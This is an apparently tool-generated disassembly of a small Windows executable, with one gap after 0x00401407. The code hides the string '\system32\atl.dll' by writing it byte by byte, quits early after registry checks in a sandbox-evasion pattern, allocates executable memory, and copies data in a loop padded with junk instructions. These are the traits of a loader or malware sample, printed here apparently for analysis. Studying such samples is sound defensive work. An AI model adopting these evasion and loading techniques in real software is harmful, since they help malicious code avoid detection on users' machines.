0x00401000:	pushl	%ebp	; from: 0x004013d8(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x8, %esp
0x00401006:	movl	0x8(%ebp), %eax
0x00401009:	movl	%eax, -4(%ebp)
0x0040100c:	movl	0xc(%ebp), %ecx
0x0040100f:	movl	%ecx, -8(%ebp)
0x00401012:	movl	-4(%ebp), %edx
0x00401015:	cmpl	-8(%ebp), %edx
0x00401018:	jae	0x00401021	; targets: 0x0040101a(MAY)
0x0040101a:	movl	-4(%ebp), %eax	; from: 0x00401018(MAY)
0x0040101d:	jmp	0x00401024	; targets: 0x00401024(MAY)
0x00401024:	movl	%ebp, %esp	; from: 0x0040101d(MAY)
0x00401026:	popl	%ebp
0x00401027:	ret	; targets: 0x004013dd(MAY)

0x00401030:	pushl	%ebp	; from: 0x0040125f(MAY), 0x00401337(MAY)
0x00401031:	movl	%esp, %ebp
0x00401033:	movl	0x00403014, %eax
0x00401038:	movb	$0x73, 0x3(%eax)
0x0040103c:	movl	0x00403014, %ecx
0x00401042:	movb	$0x74, 0x4(%ecx)
0x00401046:	movl	0x00403014, %edx
0x0040104c:	movb	$0x65, 0x5(%edx)
0x00401050:	movl	0x00403014, %eax
0x00401055:	movb	$0x6d, 0x6(%eax)
0x00401059:	movl	0x00403014, %ecx
0x0040105f:	movb	$0x33, 0x7(%ecx)
0x00401063:	movl	0x00403014, %edx
0x00401069:	movb	$0x32, 0x8(%edx)
0x0040106d:	movl	0x00403014, %eax
0x00401072:	movb	$0x5c, 0x9(%eax)
0x00401076:	movl	0x00403014, %ecx
0x0040107c:	movb	$0x61, 0xa(%ecx)
0x00401080:	movl	0x00403014, %edx
0x00401086:	movb	$0x74, 0xb(%edx)
0x0040108a:	movl	0x00403014, %eax
0x0040108f:	movb	$0x6c, 0xc(%eax)
0x00401093:	movl	0x00403014, %ecx
0x00401099:	movb	$0x2e, 0xd(%ecx)
0x0040109d:	movl	0x00403014, %edx
0x004010a3:	movb	$0x64, 0xe(%edx)
0x004010a7:	movl	0x00403014, %eax
0x004010ac:	movb	$0x6c, 0xf(%eax)
0x004010b0:	movl	0x00403014, %ecx
0x004010b6:	movb	$0x6c, 0x10(%ecx)
0x004010ba:	movl	0x00403014, %edx
0x004010c0:	movb	$0x5c, (%edx)
0x004010c3:	movl	0x00403014, %eax
0x004010c8:	movb	$0x73, 0x1(%eax)
0x004010cc:	movl	0x00403014, %ecx
0x004010d2:	movb	$0x79, 0x2(%ecx)
0x004010d6:	popl	%ebp
0x004010d7:	ret	; targets: 0x0040133c(MAY), 0x00401264(MAY)


start:
0x004010e0:	pushl	%ebp
0x004010e1:	movl	%esp, %ebp
0x004010e3:	subl	$0x178, %esp
0x004010e9:	pusha	
0x004010ea:	movl	%ebp, 0x00406104
0x004010f0:	movl	$0x0, -328(%ebp)
0x004010fa:	leal	-296(%ebp), %eax
0x00401100:	pushl	%eax
0x00401101:	pushl	$0x20019
0x00401106:	pushl	$0x0
0x00401108:	pushl	$0x40306c
0x0040110d:	pushl	$0x80000002
0x00401112:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x00401118:	testl	%eax, %eax
0x0040111a:	je	0x0040112b	; targets: 0x0040112b(MAY), 0x0040111c(MAY)
0x0040111c:	pushl	$0x4	; from: 0x0040111a(MAY)
0x0040111e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000f20(MAY)
0x00401124:	xorl	%eax, %eax
0x00401126:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x0040112b:	leal	-296(%ebp), %ecx	; from: 0x0040111a(MAY)
0x00401131:	pushl	%ecx
0x00401132:	pushl	$0x20019
0x00401137:	pushl	$0x0
0x00401139:	pushl	$0x403080
0x0040113e:	movl	-296(%ebp), %edx
0x00401144:	pushl	%edx
0x00401145:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x0040114b:	testl	%eax, %eax
0x0040114d:	je	0x0040115e	; targets: 0x0040114f(MAY), 0x0040115e(MAY)
0x0040114f:	pushl	$0x4	; from: 0x0040114d(MAY)
0x00401151:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000f20(MAY)
0x00401157:	xorl	%eax, %eax
0x00401159:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x0040115e:	leal	-296(%ebp), %eax	; from: 0x0040114d(MAY)
0x00401164:	pushl	%eax
0x00401165:	pushl	$0x20019
0x0040116a:	pushl	$0x0
0x0040116c:	pushl	$0x403090
0x00401171:	movl	-296(%ebp), %ecx
0x00401177:	pushl	%ecx
0x00401178:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x0040117e:	testl	%eax, %eax
0x00401180:	je	0x00401191	; targets: 0x00401191(MAY), 0x00401182(MAY)
0x00401182:	pushl	$0x4	; from: 0x00401180(MAY)
0x00401184:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000f20(MAY)
0x0040118a:	xorl	%eax, %eax
0x0040118c:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x00401191:	leal	-296(%ebp), %edx	; from: 0x00401180(MAY)
0x00401197:	pushl	%edx
0x00401198:	pushl	$0x20019
0x0040119d:	pushl	$0x0
0x0040119f:	pushl	$0x4030b0
0x004011a4:	movl	-296(%ebp), %eax
0x004011aa:	pushl	%eax
0x004011ab:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x004011b1:	testl	%eax, %eax
0x004011b3:	je	0x004011c9	; targets: 0x004011b5(MAY), 0x004011c9(MAY)
0x004011b5:	pushl	$0x4	; from: 0x004011b3(MAY)
0x004011b7:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000f20(MAY)
0x004011bd:	xorl	%eax, %eax
0x004011bf:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x004011c9:	movl	CreateFileA@kernel32.dll, %ecx	; from: 0x004011b3(MAY)
0x004011cf:	movl	%ecx, -348(%ebp)
0x004011d5:	movl	$0x407204, -312(%ebp)
0x004011df:	movl	$0x0, -296(%ebp)
0x004011e9:	movl	$0x0, -276(%ebp)
0x004011f3:	movl	$0x64, -320(%ebp)
0x004011fd:	movl	$0x1, -284(%ebp)
0x00401207:	movl	$0x0, -328(%ebp)
0x00401211:	movl	$0x0, -292(%ebp)
0x0040121b:	movl	$0x1, -316(%ebp)
0x00401225:	movl	$0x0, -328(%ebp)
0x0040122f:	movl	$0x0, -292(%ebp)
0x00401239:	movl	$0x1, -316(%ebp)
0x00401243:	movl	$0x3, -280(%ebp)
0x0040124d:	pushl	$0x104
0x00401252:	leal	-272(%ebp), %edx
0x00401258:	pushl	%edx
0x00401259:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000f80(MAY)
0x0040125f:	call	0x00401030	; targets: 0x00401030(MAY)
0x00401264:	movl	-312(%ebp), %eax	; from: 0x004010d7(MAY)
0x0040126a:	pushl	%eax
0x0040126b:	call	0x00401620	; targets: 0x00401620(MAY)
0x00401270:	addl	$0x4, %esp	; from: 0x0040162a(MAY)
0x00401273:	movl	%eax, -332(%ebp)
0x00401279:	movl	0x00403014, %ecx
0x0040127f:	pushl	%ecx
0x00401280:	leal	-272(%ebp), %edx
0x00401286:	pushl	%edx
0x00401287:	call	lstrlenA@kernel32.dll	; targets: 0xff000f50(MAY)
0x0040128d:	leal	-272(%ebp,%eax), %eax
0x00401294:	pushl	%eax
0x00401295:	call	lstrcpyA@kernel32.dll	; targets: 0xff000670(MAY)
0x0040129b:	pushl	$0x0
0x0040129d:	pushl	$0x80
0x004012a2:	pushl	$0x3
0x004012a4:	pushl	$0x0
0x004012a6:	movl	-280(%ebp), %ecx
0x004012ac:	pushl	%ecx
0x004012ad:	movl	-316(%ebp), %edx
0x004012b3:	pushl	%edx
0x004012b4:	leal	-272(%ebp), %eax
0x004012ba:	pushl	%eax
0x004012bb:	call	-348(%ebp)	; targets: 0xff000ef0(MAY)
0x004012c1:	movl	%eax, -300(%ebp)
0x004012c7:	cmpl	$0xffffffff, -300(%ebp)
0x004012ce:	je	0x004012d9	; targets: 0x004012d9(MAY), 0x004012d0(MAY)
0x004012d0:	cmpl	$0x0, -300(%ebp)	; from: 0x004012ce(MAY)
0x004012d7:	jne	0x004012e0	; targets: 0x004012d9(MAY), 0x004012e0(MAY)
0x004012d9:	xorl	%eax, %eax	; from: 0x004012d7(MAY), 0x004012ce(MAY)
0x004012db:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x004012e0:	movl	-332(%ebp), %ecx	; from: 0x004012d7(MAY)
0x004012e6:	pushl	%ecx
0x004012e7:	call	0x00401770	; targets: 0x00401770(MAY)
0x004012ec:	addl	$0x4, %esp	; from: 0x00401791(MAY)
0x004012ef:	movl	%eax, -324(%ebp)
0x004012f5:	movl	-332(%ebp), %edx
0x004012fb:	pushl	%edx
0x004012fc:	pushl	$0x0
0x004012fe:	movl	-324(%ebp), %eax
0x00401304:	pushl	%eax
0x00401305:	call	0x004016d0	; targets: 0x004016d0(MAY)
0x0040130a:	addl	$0xc, %esp	; from: 0x004016d4(MAY)
0x0040130d:	movl	-332(%ebp), %ecx
0x00401313:	movl	%ecx, -340(%ebp)
0x00401319:	movl	CreateFileA@kernel32.dll, %edx
0x0040131f:	movl	%edx, -352(%ebp)
0x00401325:	pushl	$0x104
0x0040132a:	leal	-272(%ebp), %eax
0x00401330:	pushl	%eax
0x00401331:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000f80(MAY)
0x00401337:	call	0x00401030	; targets: 0x00401030(MAY)
0x0040133c:	movl	-312(%ebp), %ecx	; from: 0x004010d7(MAY)
0x00401342:	pushl	%ecx
0x00401343:	call	0x00401620	; targets: 0x00401620(MAY)
0x00401348:	addl	$0x4, %esp	; from: 0x0040162a(MAY)
0x0040134b:	movl	%eax, -332(%ebp)
0x00401351:	movl	0x00403014, %edx
0x00401357:	pushl	%edx
0x00401358:	leal	-272(%ebp), %eax
0x0040135e:	pushl	%eax
0x0040135f:	call	lstrlenA@kernel32.dll	; targets: 0xff000f50(MAY)
0x00401365:	leal	-272(%ebp,%eax), %ecx
0x0040136c:	pushl	%ecx
0x0040136d:	call	lstrcpyA@kernel32.dll	; targets: 0xff000670(MAY)
0x00401373:	pushl	$0x0
0x00401375:	pushl	$0x80
0x0040137a:	pushl	$0x3
0x0040137c:	pushl	$0x0
0x0040137e:	movl	-280(%ebp), %edx
0x00401384:	pushl	%edx
0x00401385:	movl	-316(%ebp), %eax
0x0040138b:	pushl	%eax
0x0040138c:	leal	-272(%ebp), %ecx
0x00401392:	pushl	%ecx
0x00401393:	call	-352(%ebp)	; targets: 0xff000ef0(MAY)
0x00401399:	movl	%eax, -300(%ebp)
0x0040139f:	cmpl	$0xffffffff, -300(%ebp)
0x004013a6:	je	0x004013b1	; targets: 0x004013b1(MAY), 0x004013a8(MAY)
0x004013a8:	cmpl	$0x0, -300(%ebp)	; from: 0x004013a6(MAY)
0x004013af:	jne	0x004013b8	; targets: 0x004013b1(MAY), 0x004013b8(MAY)
0x004013b1:	xorl	%eax, %eax	; from: 0x004013a6(MAY), 0x004013af(MAY)
0x004013b3:	jmp	0x0040161a	; targets: 0x0040161a(MAY)
0x004013b8:	movl	-328(%ebp), %edx	; from: 0x004013af(MAY)
0x004013be:	cmpl	-332(%ebp), %edx
0x004013c4:	jae	0x00401450	; targets: 0x004013ca(MAY)
0x004013ca:	movl	-340(%ebp), %eax	; from: 0x004013c4(MAY)
0x004013d0:	pushl	%eax
0x004013d1:	movl	-320(%ebp), %ecx
0x004013d7:	pushl	%ecx
0x004013d8:	call	0x00401000	; targets: 0x00401000(MAY)
0x004013dd:	addl	$0x8, %esp	; from: 0x00401027(MAY)
0x004013e0:	movl	%eax, -344(%ebp)
0x004013e6:	movl	-344(%ebp), %edx
0x004013ec:	pushl	%edx
0x004013ed:	movl	-312(%ebp), %eax
0x004013f3:	addl	-292(%ebp), %eax
0x004013f9:	pushl	%eax
0x004013fa:	movl	-324(%ebp), %ecx
0x00401400:	addl	-328(%ebp), %ecx
0x00401406:	pushl	%ecx
0x00401407:	call	0x004016e0	; targets: 0x004016e0(MAY)
0x0040161a:	movl	%ebp, %esp	; from: 0x0040118c(MAY), 0x004012db(MAY), 0x004013b3(MAY), 0x004011bf(MAY), 0x00401159(MAY), 0x00401126(MAY)
0x0040161c:	popl	%ebp
0x0040161d:	ret	; targets: 0xfee70000(MAY)

0x00401620:	pushl	%ebp	; from: 0x00401343(MAY), 0x0040126b(MAY)
0x00401621:	movl	%esp, %ebp
0x00401623:	movl	0x8(%ebp), %eax
0x00401626:	movl	-4(%eax), %eax
0x00401629:	popl	%ebp
0x0040162a:	ret	; targets: 0x00401270(MAY), 0x00401348(MAY)

0x004016d0:	pushl	%ebp	; from: 0x00401305(MAY)
0x004016d1:	movl	%esp, %ebp
0x004016d3:	popl	%ebp
0x004016d4:	ret	; targets: 0x0040130a(MAY)

0x004016e0:	pushl	%ebp	; from: 0x00401407(MAY)
0x004016e1:	movl	%esp, %ebp
0x004016e3:	subl	$0x14, %esp
0x004016e6:	movl	$0x1524, -8(%ebp)
0x004016ed:	movl	$0x1524, -8(%ebp)
0x004016f4:	movl	$0x0, -20(%ebp)
0x004016fb:	jmp	0x00401706	; targets: 0x00401706(MAY)
0x004016fd:	movl	-20(%ebp), %eax	; from: 0x0040175c(MAY)
0x00401700:	addl	$0x1, %eax
0x00401703:	movl	%eax, -20(%ebp)
0x00401706:	movl	-20(%ebp), %ecx	; from: 0x004016fb(MAY)
0x00401709:	cmpl	0x10(%ebp), %ecx
0x0040170c:	jnl	0x0040175e	; targets: 0x0040170e(MAY), 0x0040175e(MAY)
0x0040170e:	movl	$0x1524, -8(%ebp)	; from: 0x0040170c(MAY)
0x00401715:	movl	$0x1524, -8(%ebp)
0x0040171c:	movl	0xc(%ebp), %edx
0x0040171f:	addl	-20(%ebp), %edx
0x00401722:	movzbl	(%edx), %eax
0x00401725:	movl	%eax, -16(%ebp)
0x00401728:	movl	$0x1524, -8(%ebp)
0x0040172f:	movl	$0x1524, -8(%ebp)
0x00401736:	xorl	%ecx, %ecx
0x00401738:	je	0x0040173c	; targets: 0x0040173c(MAY)
0x0040173c:	movl	$0x1524, -8(%ebp)	; from: 0x00401738(MAY)
0x00401743:	movl	0x8(%ebp), %edx
0x00401746:	addl	-20(%ebp), %edx
0x00401749:	movb	-16(%ebp), %al
0x0040174c:	movb	%al, (%edx)
0x0040174e:	movl	$0x1524, -8(%ebp)
0x00401755:	movl	$0x1524, -8(%ebp)
0x0040175c:	jmp	0x004016fd	; targets: 0x004016fd(MAY)
0x0040175e:	movl	%ebp, %esp	; from: 0x0040170c(MAY)
0x00401760:	popl	%ebp
0x00401761:	ret	; targets: unresolved

0x00401770:	pushl	%ebp	; from: 0x004012e7(MAY)
0x00401771:	movl	%esp, %ebp
0x00401773:	pushl	%ecx
0x00401774:	movl	$0x4, -4(%ebp)
0x0040177b:	pushl	$0x40
0x0040177d:	pushl	$0x3000
0x00401782:	movl	0x8(%ebp), %eax
0x00401785:	pushl	%eax
0x00401786:	pushl	$0x0
0x00401788:	call	VirtualAlloc@kernel32.dll	; targets: 0xff0006a0(MAY)
0x0040178e:	movl	%ebp, %esp
0x00401790:	popl	%ebp
0x00401791:	ret	; targets: 0x004012ec(MAY)

